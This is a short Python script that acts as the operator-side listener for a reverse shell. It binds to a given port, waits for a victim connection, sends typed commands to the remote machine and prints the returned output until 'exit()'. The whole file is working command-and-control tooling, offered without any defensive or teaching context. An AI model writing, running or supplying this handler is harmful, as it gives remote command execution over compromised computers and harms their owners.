#!/usr/bin/env python
import socket,subprocess as sp,sys

host = sys.argv[1]
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.bind((host,port))
s.listen(100)
conn,addr = s.accept()

print ("[+]connection from %s" %(str(addr[0])))

while 1:
    command = input("#> ")

    if command != "exit()":
        if command == "":continue
        
        conn.send(command.encode('utf-8'))
        result = (conn.recv(1024)).decode('utf-8')

        total_size = result[0:16]
        result = result[16:]
        
        while int(total_size) > len(result):
            data = conn.recv(1024).decode('utf-8')
            result += data

        print (result.rstrip("\n"))
        
    else:
        conn.send("exit()".encode('utf-8'))
        print ("[+]shell down")
        break
s.close()
